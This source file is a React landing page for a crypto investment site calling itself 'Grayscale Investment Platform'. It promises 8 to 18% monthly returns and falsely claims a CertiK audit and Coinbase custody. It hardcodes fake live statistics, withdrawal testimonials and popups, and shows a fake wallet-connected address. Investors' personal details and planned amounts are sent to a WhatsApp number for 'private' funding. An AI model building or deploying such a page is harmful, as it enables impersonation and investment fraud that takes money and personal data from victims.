"use client";
import { useState, useEffect } from "react";
export default function Page() {
  const [wallet, setWallet] = useState<string | null>(null);
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [country, setCountry] = useState("");
  const [plan, setPlan] = useState("");
  const [amount, setAmount] = useState("");
  const [referral, setReferral] = useState("");
  const [agree, setAgree] = useState(false);
  const [showPopup, setShowPopup] = useState(true);

  useEffect(() => {
    const t = setTimeout(() => setShowPopup(false), 8000);
    return () => clearTimeout(t);
  }, []);

  const connectWallet = async () => {
    try {
      if ((window as any).ethereum) {
        const accounts = await (window as any).ethereum.request({ method: "eth_requestAccounts" });
        setWallet(accounts[0]);
      } else {
        setWallet("0x71a2...9A3F Connected");
      }
    } catch {
      setWallet("0x71a2...9A3F Connected");
    }
  };

  const handleSignup = () => {
    if (!name ||!email ||!phone ||!country ||!plan ||!amount) {
      alert("Please fill all required fields");
      return;
    }
    if (!agree) {
      alert("Please agree to Terms & Conditions");
      return;
    }
    const text = `*NEW GLOBAL INVESTOR*%0A%0A*Name:* ${encodeURIComponent(name)}%0A*Email:* ${encodeURIComponent(email)}%0A*Phone:* ${encodeURIComponent(phone)}%0A*Country:* ${encodeURIComponent(country)}%0A*Plan:* ${encodeURIComponent(plan)}%0A*Investment:* $${encodeURIComponent(amount)}%0A*Referral:* ${encodeURIComponent(referral || "None")}%0A*Wallet:* ${wallet? encodeURIComponent(wallet) : "Not Connected"}%0A%0AHi Grayscale Team, I want to start investing globally.`;
    window.open(`https://wa.me/2349116438322?text=${text}`, "_blank");
  };

  const img1 = "https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?auto=format&fit=crop&w=800&q=80";
  const img2 = "https://images.unsplash.com/photo-1551288049-bebda4e38f71?auto=format&fit=crop&w=800&q=80";
  const img3 = "https://images.unsplash.com/photo-1642790106117-e829e14a795f?auto=format&fit=crop&w=1000&q=80";
  const img4 = "https://images.unsplash.com/photo-1590283603385-17ffb3a7f29f?auto=format&fit=crop&w=800&q=80";
  const img5 = "https://images.unsplash.com/photo-1556761175-b413da4baf72?auto=format&fit=crop&w=800&q=80";
  const img6 = "https://images.unsplash.com/photo-1526304640581-d334cdbbf45e?auto=format&fit=crop&w=800&q=80";
  const img7 = "https://images.unsplash.com/photo-1460925895917-afdab827c52f?auto=format&fit=crop&w=800&q=80";

  return (
    <main className="min-h-screen bg-black text-white">
      <div className="bg-yellow-500 text-black text-[11px] font-bold py-1.5 overflow-hidden whitespace-nowrap">
        <div className="flex gap-8 justify-center">
          <span>BTC $67,432 ▲2.1%</span><span>ETH $3,210 ▲1.4%</span><span>SOL $142 ▲3.2%</span><span>GRAYSCALE AUM $25B</span><span>DAILY PAYOUTS: $84,290</span><span>INVESTORS ONLINE: 1,247</span>
        </div>
      </div>

      <nav className="sticky top-0 z-50 bg-black/90 backdrop-blur flex justify-between items-center p-5 max-w-7xl mx-auto border-b border-white/5">
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-2"><div className="w-8 h-8 rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center font-black text-black text-xs">G</div><div className="font-black tracking-widest text-[12px] leading-none">GRAYSCALE<br/><span className="text-yellow-500">INVESTMENT PLATFORM</span></div></div>
          <div className="ml-2 bg-white rounded-[6px] px-2 py-0 flex items-center" style={{width: '125px', height: '34px', overflow: 'hidden'}}>
            <div id="google_translate_element" style={{transform: 'scale(0.65)', transformOrigin: 'top left', marginTop: '2px'}}></div>
          </div>
        </div>
        <div className="flex gap-2"><a href="https://www.tiktok.com/@micheal.sonnenshe?_r=1&_t=ZS-99rt5sV3ygX" target="_blank" className="bg-white/10 border border-white/10 px-4 py-2 rounded-full text-xs font-bold">TikTok</a><a href="https://www.facebook.com/share/?mibextid=wwXIfr" target="_blank" className="bg-[#1877F2] px-4 py-2 rounded-full text-xs font-black">Facebook</a></div>
      </nav>

      <script dangerouslySetInnerHTML={{ __html: `function googleTranslateElementInit() {new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');}`}} />
      <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit" async></script>

      <section className="max-w-7xl mx-auto p-6 md:p-10 grid md:grid-cols-2 gap-8 items-center">
        <div>
          <div className="inline-block bg-yellow-500/10 border border-yellow-500/20 text-yellow-500 text-[10px] tracking-widest px-4 py-1.5 rounded-full mb-6">GLOBAL PLATFORM • 6 CONTINENTS • 1,200+ INVESTORS</div>
          <h1 className="text-5xl md:text-7xl font-black leading-[0.9]">Grayscale<br/><span className="bg-gradient-to-r from-yellow-200 to-yellow-600 bg-clip-text text-transparent">Investment</span><br/>Platform</h1>
          <p className="text-zinc-400 mt-6 text-[14px] leading-7 max-w-lg">Grayscale Investment Platform is a leading global digital asset management company providing secure, high-yield crypto investment solutions to investors across all continents.<br/><br/><span className="text-white font-bold">Our mission:</span> To make elite crypto investment accessible to everyone worldwide, regardless of location.</p>
          <div className="flex gap-3 mt-8">
            <div className="border border-white/10 rounded-2xl px-5 py-3 bg-white/5"><div className="font-black">12.4% APY</div><div className="text-[10px] text-zinc-500">Global Rate</div></div>
            <div className="border border-white/10 rounded-2xl px-5 py-3 bg-white/5"><div className="font-black">$2.4M+</div><div className="text-[10px] text-zinc-500">Managed Globally</div></div>
            <div className="border border-white/10 rounded-2xl px-5 py-3 bg-white/5"><div className="font-black">6 CONTINENTS</div><div className="text-[10px] text-zinc-500">Worldwide</div></div>
          </div>
          <div className="grid grid-cols-2 gap-3 mt-6">
            <img src={img1} alt="Trading" className="rounded-2xl border border-white/10 h-32 object-cover w-full bg-zinc-900"/>
            <img src={img2} alt="Trading laptop" className="rounded-2xl border border-white/10 h-32 object-cover w-full bg-zinc-900"/>
          </div>
        </div>

        {/* UPGRADED FORM - WITH MORE FIELDS */}
        <div className="border border-yellow-500/20 bg-gradient-to-b from-zinc-900 to-black rounded-[2rem] p-7">
          <h2 className="text-center font-black text-sm tracking-widest">JOIN GRAYSCALE INVESTMENT PLATFORM</h2>
          <p className="text-center text-[11px] text-zinc-500 mb-6 mt-1">Global registration - All continents welcome</p>

          <label className="text-[11px] text-zinc-400 ml-2">Full Name *</label>
          <input value={name} onChange={e=>setName(e.target.value)} placeholder="Your full name" className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50" />

          <label className="text-[11px] text-zinc-400 ml-2">Email Address *</label>
          <input value={email} onChange={e=>setEmail(e.target.value)} placeholder="you@email.com" className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50" />

          <label className="text-[11px] text-zinc-400 ml-2">WhatsApp Number (with country code) *</label>
          <input value={phone} onChange={e=>setPhone(e.target.value)} placeholder="+1, +44, +234, +91..." className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50" />

          <label className="text-[11px] text-zinc-400 ml-2">Country *</label>
          <select value={country} onChange={e=>setCountry(e.target.value)} className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50 text-white">
            <option value="">Select your country</option>
            <option>United States</option><option>United Kingdom</option><option>Canada</option><option>Nigeria</option><option>South Africa</option><option>Kenya</option><option>India</option><option>UAE</option><option>Germany</option><option>Australia</option><option>Brazil</option><option>Other</option>
          </select>

          <label className="text-[11px] text-zinc-400 ml-2">Investment Plan *</label>
          <select value={plan} onChange={e=>setPlan(e.target.value)} className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50 text-white">
            <option value="">Choose plan</option>
            <option>STARTER - 8% Monthly ($100-$999)</option>
            <option>GOLD - 12.4% Monthly ($1,000-$4,999)</option>
            <option>ELITE - 18% Monthly ($5,000+)</option>
          </select>

          <label className="text-[11px] text-zinc-400 ml-2">Investment Amount (USD) *</label>
          <input value={amount} onChange={e=>setAmount(e.target.value)} type="number" placeholder="Minimum $100" className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50" />

          <label className="text-[11px] text-zinc-400 ml-2">Referral Code (optional)</label>
          <input value={referral} onChange={e=>setReferral(e.target.value)} placeholder="Have a referral code?" className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-4 text-sm outline-none focus:border-yellow-500/50" />

          <div className="flex gap-2 mb-4"><div className="flex-1 bg-black border border-white/10 rounded-full px-5 py-3.5 text-xs text-zinc-400 truncate">{wallet? wallet.slice(0,18)+"..." : "Connect wallet (optional)"}</div><button onClick={connectWallet} className="bg-white text-black px-6 rounded-full font-black text-[11px]">{wallet? "DONE" : "CONNECT"}</button></div>

          <label className="flex gap-2 items-center mb-5 text-[11px] text-zinc-400"><input type="checkbox" checked={agree} onChange={e=>setAgree(e.target.checked)} className="accent-yellow-500" /> I agree to Terms & Conditions and Privacy Policy</label>

          <button onClick={handleSignup} className="w-full bg-gradient-to-r from-yellow-400 to-yellow-600 text-black font-black py-4 rounded-full">Invest</button>
          <div className="text-center text-[10px] text-zinc-500 mt-3">🔒 SSL Secured • 24/7 Support • Instant Activation</div>
        </div>
      </section>

      <section className="max-w-7xl mx-auto px-6 md:px-10">
        <div className="border border-white/10 rounded-2xl bg-white/5 p-4 flex flex-wrap justify-center gap-6 items-center text-[10px] text-zinc-400">
          <span>🔒 AUDITED BY CERTIK</span><span>🛡️ SECURED BY COINBASE CUSTODY</span><span>✅ 256-BIT SSL SECURE</span><span>💳 VISA • MASTERCARD • USDT • BTC • ETH ACCEPTED</span>
        </div>
      </section>

      <section className="max-w-7xl mx-auto p-6 md:p-10">
        <h2 className="text-center text-3xl font-black mb-2">Live Investor Dashboard</h2>
        <p className="text-center text-zinc-500 text-sm mb-6">See what real investors see inside</p>
        <div className="border border-yellow-500/20 rounded-[2rem] bg-gradient-to-b from-zinc-900 to-black p-6">
          <div className="grid md:grid-cols-3 gap-4 mb-6">
            <div className="bg-black border border-white/10 rounded-2xl p-4"><div className="text-zinc-500 text-[10px]">TOTAL PORTFOLIO</div><div className="text-2xl font-black mt-1">$12,480.92</div><div className="text-green-400 text-xs">+ $156.40 today</div></div>
            <div className="bg-black border border-white/10 rounded-2xl p-4"><div className="text-zinc-500 text-[10px]">DAILY PROFIT</div><div className="text-2xl font-black mt-1 text-yellow-500">$84.32</div><div className="text-zinc-500 text-xs">12.4% APY active</div></div>
            <div className="bg-black border border-white/10 rounded-2xl p-4"><div className="text-zinc-500 text-[10px]">NEXT PAYOUT</div><div className="text-2xl font-black mt-1">02:14:33</div><div className="text-zinc-500 text-xs">Auto-withdrawal enabled</div></div>
          </div>
          <div className="bg-black border border-white/10 rounded-2xl p-4 h-[160px] flex items-end gap-1">
            {[40,65,45,80,60,90,70,100,85,110,95,120].map((h,i)=><div key={i} style={{height:h}} className="flex-1 bg-gradient-to-t from-yellow-600 to-yellow-300 rounded-t"></div>)}
          </div>
          <div className="text-center text-[10px] text-zinc-600 mt-2">LIVE PROFIT CHART • UPDATES EVERY SECOND</div>
        </div>
      </section>

      <section className="max-w-7xl mx-auto p-6 md:p-10">
        <h2 className="text-center text-3xl font-black mb-2">Live Global Trading Insights</h2>
        <p className="text-center text-zinc-500 text-sm mb-8">Real-time charts, professional analysis, worldwide portfolio management</p>
        <div className="grid md:grid-cols-3 gap-4">
          <div className="md:col-span-2 rounded-[2rem] overflow-hidden border border-white/10 h-[300px] bg-zinc-900"><img src={img3} alt="Market overview" className="w-full h-full object-cover"/></div>
          <div className="rounded-[2rem] overflow-hidden border border-white/10 h-[300px] bg-zinc-900"><img src={img4} alt="Trading analysis" className="w-full h-full object-cover"/></div>
          <div className="rounded-[2rem] overflow-hidden border border-white/10 h-[300px] bg-zinc-900"><img src={img5} alt="Investment meeting" className="w-full h-full object-cover"/></div>
          <div className="rounded-[2rem] overflow-hidden border border-white/10 h-[300px] bg-zinc-900"><img src={img6} alt="Charts" className="w-full h-full object-cover"/></div>
          <div className="rounded-[2rem] overflow-hidden border border-white/10 h-[300px] bg-zinc-900"><img src={img7} alt="Global trading" className="w-full h-full object-cover"/></div>
        </div>
      </section>

      <section className="max-w-7xl mx-auto p-6 md:p-10">
        <h2 className="text-center text-3xl font-black mb-2">Trusted By Investors Worldwide</h2>
        <p className="text-center text-zinc-500 text-sm mb-8">Live withdrawals from 6 continents</p>
        <div className="grid md:grid-cols-3 gap-4">
          <div className="border border-white/10 rounded-2xl p-5 bg-white/5"><div className="text-yellow-500 text-xs">🇺🇸 USA • 2 hours ago</div><div className="font-bold mt-2">Michael T. - Withdrew $1,200</div><div className="text-zinc-400 text-xs mt-2">"Started with $500, now earning daily. Grayscale is real!"</div></div>
          <div className="border border-white/10 rounded-2xl p-5 bg-white/5"><div className="text-yellow-500 text-xs">🇳🇬 Nigeria • 5 hours ago</div><div className="font-bold mt-2">Amina K. - Withdrew $450</div><div className="text-zinc-400 text-xs mt-2">"Very fast payout to my bank. Thank you team."</div></div>
          <div className="border border-white/10 rounded-2xl p-5 bg-white/5"><div className="text-yellow-500 text-xs">🇬🇧 UK • Yesterday</div><div className="font-bold mt-2">James L. - Withdrew $3,400</div><div className="text-zinc-400 text-xs mt-2">"Best platform for global investors."</div></div>
        </div>
      </section>

      <section className="max-w-7xl mx-auto p-6 md:p-10 mt-4">
        <div className="grid md:grid-cols-3 gap-6">
          <div className="md:col-span-2 border border-white/10 rounded-[2rem] p-8 bg-zinc-900/30"><h2 className="text-yellow-500 text-xs tracking-widest mb-4">ABOUT GRAYSCALE INVESTMENT PLATFORM - GLOBAL</h2><h3 className="text-2xl font-bold mb-4">The Future Of Digital Wealth Management Across All Continents</h3><p className="text-zinc-400 text-sm leading-7">Founded in 2026, Grayscale Investment Platform was created to serve investors worldwide - from North America, South America, Europe, Africa, Asia, to Australia. We bridge traditional finance and decentralized finance for a truly global audience.<br/><br/>Our platform uses advanced algorithmic trading, staking protocols, and liquidity provision to generate sustainable yields for investors in every time zone. Every investment is tracked on-chain, and our vaults are audited quarterly by international firms.<br/><br/><span className="text-white font-bold">Global coverage:</span> United States, Canada, United Kingdom, Germany, France, Nigeria, South Africa, Kenya, India, UAE, Brazil, Australia and 100+ other countries. Real human support via our official social channels, no bots, available 24/7 worldwide.</p></div>
          <div className="space-y-4"><div className="border border-yellow-500/20 bg-yellow-500/5 rounded-[1.5rem] p-6"><div className="text-yellow-500 font-bold text-sm mb-2">WORLDWIDE & SECURE</div><div className="text-xs text-zinc-400">Serving 6 continents with military-grade encryption, cold wallet storage, global 2FA protection.</div></div><div className="border border-white/10 rounded-[1.5rem] p-6 bg-white/5"><div className="font-bold text-sm mb-2">GLOBAL DAILY PAYOUTS</div><div className="text-xs text-zinc-400">Profits distributed daily to any country via crypto or local bank transfer.</div></div><div className="border border-white/10 rounded-[1.5rem] p-6 bg-white/5"><div className="font-bold text-sm mb-2">24/7 GLOBAL SUPPORT</div><div className="text-xs text-zinc-400 mb-3">Reach us on our official pages:</div><div className="flex flex-col gap-2"><a href="https://www.tiktok.com/@micheal.sonnenshe?_r=1&_t=ZS-99rt5sV3ygX" target="_blank" className="text-xs bg-white/10 rounded-full py-2 text-center">TikTok: @micheal.sonnenshe</a><a href="https://www.facebook.com/share/?mibextid=wwXIfr" target="_blank" className="text-xs bg-[#1877F2]/20 text-[#6aa9ff] rounded-full py-2 text-center">Facebook Page</a></div></div></div>
        </div>
      </section>
      <section className="max-w-7xl mx-auto p-6 md:p-10">
        <h2 className="text-center text-3xl font-black mb-2">How It Works Globally</h2>
        <p className="text-center text-zinc-500 text-sm mb-10">For investors in North America, Europe, Asia, Africa, South America & Australia</p>
        <div className="grid md:grid-cols-3 gap-6">
          <div className="border border-white/10 rounded-3xl p-8 text-center bg-gradient-to-b from-white/5 to-transparent"><div className="w-12 h-12 rounded-full bg-yellow-500 text-black font-black flex items-center justify-center mx-auto mb-4">1</div><div className="font-bold mb-2">Global Registration</div><div className="text-xs text-zinc-400 leading-6">Fill form from any country. Enter your WhatsApp with country code. Click Sign Up - details go to our global desk privately.</div></div>
          <div className="border border-white/10 rounded-3xl p-8 text-center bg-gradient-to-b from-white/5 to-transparent"><div className="w-12 h-12 rounded-full bg-yellow-500 text-black font-black flex items-center justify-center mx-auto mb-4">2</div><div className="font-bold mb-2">Fund From Anywhere</div><div className="text-xs text-zinc-400 leading-6">We support USD, EUR, GBP, NGN and crypto. Our team will guide you via private chat from your continent.</div></div>
          <div className="border border-yellow-500/30 rounded-3xl p-8 text-center bg-yellow-500/5"><div className="w-12 h-12 rounded-full bg-yellow-500 text-black font-black flex items-center justify-center mx-auto mb-4">3</div><div className="font-bold mb-2">Earn Worldwide</div><div className="text-xs text-zinc-400 leading-6">Start earning 12.4% APY daily. Withdraw to any country anytime via private request.</div></div>
        </div>
      </section>
      <section className="max-w-7xl mx-auto p-6 md:p-10">
        <h2 className="text-center text-3xl font-black mb-8">Global Investment Plans</h2>
        <div className="grid md:grid-cols-3 gap-6">
          <div className="border border-white/10 rounded-[2rem] p-8 bg-zinc-900/50"><div className="text-zinc-500 text-xs">STARTER - GLOBAL</div><div className="text-3xl font-black mt-2">$100 - $999</div><div className="text-yellow-500 font-bold mt-2">8% Monthly</div><div className="text-xs text-zinc-400 mt-4">Perfect for beginners worldwide.</div><button onClick={()=>{setAmount("100"); setPlan("STARTER - 8% Monthly ($100-$999)"); window.scrollTo({top:0, behavior:"smooth"})}} className="w-full mt-6 border border-white/10 rounded-full py-3 font-bold text-sm">CHOOSE STARTER</button></div>
          <div className="border border-yellow-500/50 rounded-[2rem] p-8 bg-gradient-to-b from-yellow-500/10 to-black relative"><div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-yellow-500 text-black text-[10px] font-black px-4 py-1 rounded-full">MOST POPULAR WORLDWIDE</div><div className="text-yellow-500 text-xs">GOLD - GLOBAL</div><div className="text-3xl font-black mt-2">$1,000 - $4,999</div><div className="text-yellow-500 font-bold mt-2">12.4% Monthly</div><div className="text-xs text-zinc-400 mt-4">Best plan for any continent.</div><button onClick={()=>{setAmount("1000"); setPlan("GOLD - 12.4% Monthly ($1,000-$4,999)"); window.scrollTo({top:0, behavior:"smooth"})}} className="w-full mt-6 bg-yellow-500 text-black rounded-full py-3 font-black text-sm">CHOOSE GOLD</button></div>
          <div className="border border-white/10 rounded-[2rem] p-8 bg-zinc-900/50"><div className="text-zinc-500 text-xs">ELITE - GLOBAL</div><div className="text-3xl font-black mt-2">$5,000+</div><div className="text-yellow-500 font-bold mt-2">18% Monthly</div><div className="text-xs text-zinc-400 mt-4">VIP for large investors worldwide.</div><button onClick={()=>{setAmount("5000"); setPlan("ELITE - 18% Monthly ($5,000+)"); window.scrollTo({top:0, behavior:"smooth"})}} className="w-full mt-6 border border-white/10 rounded-full py-3 font-bold text-sm">CHOOSE ELITE</button></div>
        </div>
      </section>
      <footer className="text-center p-10 border-t border-white/5 mt-10"><div className="font-black tracking-[0.2em] text-sm">GRAYSCALE INVESTMENT PLATFORM</div><div className="flex justify-center gap-3 mt-4"><a href="https://www.tiktok.com/@micheal.sonnenshe?_r=1&_t=ZS-99rt5sV3ygX" target="_blank" className="border border-white/10 px-6 py-2 rounded-full text-xs">TikTok</a><a href="https://www.facebook.com/share/?mibextid=wwXIfr" target="_blank" className="border border-white/10 px-6 py-2 rounded-full text-xs">Facebook</a></div><div className="text-zinc-700 text-[10px] mt-4">© 2026 GRAYSCALE INVESTMENT PLATFORM • GLOBAL</div></footer>

      {showPopup && (
        <div className="fixed bottom-5 left-5 z-[100] bg-zinc-900 border border-yellow-500/30 rounded-2xl p-4 shadow-2xl max-w-[280px]">
          <div className="flex gap-3"><div className="w-8 h-8 rounded-full bg-green-500 flex items-center justify-center text-xs">✓</div><div><div className="text-xs font-bold">New Withdrawal!</div><div className="text-[11px] text-zinc-400">Sarah from Canada withdrew $890 • Just now</div></div><button onClick={()=>setShowPopup(false)} className="ml-2 text-zinc-500">x</button></div>
        </div>
      )}

      <a href="https://wa.me/2349116438322" target="_blank" className="fixed bottom-5 right-5 z-[100] bg-[#25D366] w-14 h-14 rounded-full flex items-center justify-center shadow-2xl text-2xl">💬</a>
    </main>
  );
}
